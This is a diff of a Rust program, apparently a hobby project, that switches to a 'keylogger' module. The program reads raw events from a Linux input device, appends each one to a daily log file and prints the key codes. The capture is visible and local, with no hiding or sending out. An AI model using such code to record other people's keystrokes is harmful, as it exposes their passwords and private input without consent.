@@ -1,31 +1,36 @@
-use std::fs::File;
+mod keylogger;
+
+use keylogger::keyLogger;
 use std::io::{self, Read};
-use std::mem;
+use chrono::{DateTime, Local};
+use std::path::Path;
+use std::fs::File;
+use std::fs::write;
+use std::fs::OpenOptions;
+use std::io::prelude::*;
 
-#[repr(C)]
-#[derive(Debug, Copy, Clone)]
-struct Timeval {
-    tv_sec: libc::c_long,
-    tv_usec: libc::c_long,
-}
+fn main() {
+    let mut test = keyLogger::new("/dev/input/event2");
 
-#[repr(C)]
-#[derive(Debug, Copy, Clone)]
-struct InputEvent {
-    time: Timeval,
-    type_: libc::c_ushort,
-    code: libc::c_ushort,
-    value: libc::c_uint,
-}
+    let current_local: DateTime<Local> = Local::now();
+    let custom_format = current_local.format("%Y-%m-%d");
 
-fn main() -> io::Result<()> {
-    let mut file = File::open("/dev/input/event2").expect("eeror opening file");
+    let logsFileUrl = format!("./src/data/logs/{}.log", custom_format);
+
+    if (!Path::new(logsFileUrl.as_str()).exists()) {
+        let mut file = File::create(logsFileUrl.as_str())
+            .expect("Error while creating the file");
+    }
+
+    let mut logsFile = OpenOptions::new()
+        .append(true)
+        .open(logsFileUrl.as_str())
+        .expect("Error while opening the file");
 
     loop {
-        let mut event_data = [0u8; mem::size_of::<InputEvent>()];
-        file.read_exact(&mut event_data).expect("error reading file");
+        let event = &mut test.getCurrentEvent();
 
-        let event: InputEvent = unsafe { *(event_data.as_ptr() as *const InputEvent) };
+        logsFile.write_all(format!("{:?}\n", event).as_bytes());
 
         println!("{:?}", event.code);
     }
